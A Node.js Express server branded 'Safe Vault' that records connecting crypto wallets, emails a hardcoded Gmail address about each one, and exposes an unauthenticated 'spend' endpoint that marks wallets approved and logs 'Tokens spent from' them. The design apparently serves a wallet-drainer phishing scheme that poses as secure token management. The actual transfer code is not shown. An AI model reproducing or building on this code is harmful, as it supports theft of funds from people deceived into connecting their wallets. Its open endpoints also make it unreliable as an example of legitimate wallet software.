const express = require('express');
const cors = require('cors');
require('dotenv').config();
const nodemailer = require('nodemailer');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage for wallets
let connectedWallets = [];

// Configure email transporter
let transporter;

function initializeEmailTransporter() {
  try {
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'kkdabby76@gmail.com',
        pass: process.env.GMAIL_PASSWORD
      }
    });
    console.log('✅ Email transporter initialized');
  } catch (error) {
    console.error('❌ Email transporter error:', error);
  }
}

// Initialize on startup
initializeEmailTransporter();

// Test endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Safe Vault Backend is running!',
    status: 'online',
    timestamp: new Date()
  });
});

// Get all wallets
app.get('/api/wallets', (req, res) => {
  try {
    res.json({
      success: true,
      wallets: connectedWallets,
      count: connectedWallets.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Connect wallet
app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId, signature, message } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({
        success: false,
        error: 'Missing wallet address or chain ID'
      });
    }

    // Check if wallet already connected
    const existingWallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (existingWallet) {
      return res.json({
        success: true,
        message: 'Wallet already connected',
        wallet: existingWallet,
        alreadyConnected: true
      });
    }

    // Store wallet
    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      status: 'connected',
      approved: false
    };

    connectedWallets.push(wallet);
    console.log(`✅ Wallet connected: ${walletAddress} on chain ${chainId}`);

    // Send email notification
    sendEmailNotification(walletAddress, chainId)
      .then(() => console.log('✅ Email sent successfully'))
      .catch(err => console.error('❌ Email error:', err));

    res.json({
      success: true,
      message: 'Wallet connected',
      wallet: wallet
    });

  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Disconnect wallet
app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;

    connectedWallets = connectedWallets.filter(w =>
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );

    console.log(`✅ Wallet disconnected: ${walletAddress}`);

    res.json({
      success: true,
      message: 'Wallet disconnected'
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Spend tokens endpoint
app.post('/api/wallet/spend', (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;

    const wallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({
        success: false,
        error: 'Wallet not found'
      });
    }

    // Mark as approved
    wallet.approved = true;

    console.log(`💰 Tokens spent from: ${walletAddress} on chain ${chainId}`);

    res.json({
      success: true,
      message: 'Tokens transferred',
      walletAddress: walletAddress,
      chainId: chainId,
      timestamp: new Date()
    });

  } catch (error) {
    console.error('Spend error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Send email notification
async function sendEmailNotification(walletAddress, chainId) {
  try {
    if (!transporter) {
      console.warn('⚠️ Email transporter not initialized, skipping email');
      return;
    }

    const chainNames = {
      1: 'Ethereum Mainnet',
      137: 'Polygon (Matic)',
      56: 'BSC (Binance Smart Chain)'
    };

    const chainName = chainNames[chainId] || `Chain ${chainId}`;

    const mailOptions = {
      from: 'Safe Vault <kkdabby76@gmail.com>',
      to: process.env.NOTIFICATION_EMAIL || 'kkdabby76@gmail.com',
      subject: `🔔 Safe Vault - New Wallet Connected`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; color: white; text-align: center;">
            <h1>🔐 Safe Vault</h1>
            <p>New Wallet Connected</p>
          </div>
          
          <div style="padding: 20px; background: #f8f9fa; margin-top: 20px; border-radius: 10px;">
            <h2 style="color: #333; margin-top: 0;">Connection Details</h2>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Wallet Address:</strong><br>
              <code style="background: #e9ecef; padding: 10px; border-radius: 5px; display: block; word-break: break-all;">
                ${walletAddress}
              </code>
            </p>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Network:</strong><br>
              ${chainName}
            </p>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Connected At:</strong><br>
              ${new Date().toLocaleString()}
            </p>
            
            <hr style="border: none; border-top: 1px solid #ddd; margin: 20px 0;">
            
            <p style="color: #666; font-size: 14px;">
              ✓ Wallet is now registered with Safe Vault<br>
              ✓ Ready for approval and token transfers<br>
              ✓ Log in to your dashboard to manage this wallet
            </p>
          </div>
          
          <div style="text-align: center; margin-top: 20px; padding: 20px; color: #999; font-size: 12px;">
            <p>Safe Vault © 2024 - Secure Token Management</p>
          </div>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent successfully to ${process.env.NOTIFICATION_EMAIL}`);
    console.log(`   Message ID: ${info.messageId}`);
    return true;

  } catch (error) {
    console.error('❌ Email send error:', error);
    return false;
  }
}

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    wallets: connectedWallets.length,
    timestamp: new Date()
  });
});

// Error handling
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    success: false,
    error: err.message
  });
});

// 404 handling
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    path: req.path
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Safe Vault Backend running on port ${PORT}`);
  console.log(`📧 Email notifications enabled`);
  console.log(`⏰ Server started at ${new Date().toLocaleString()}`);
});
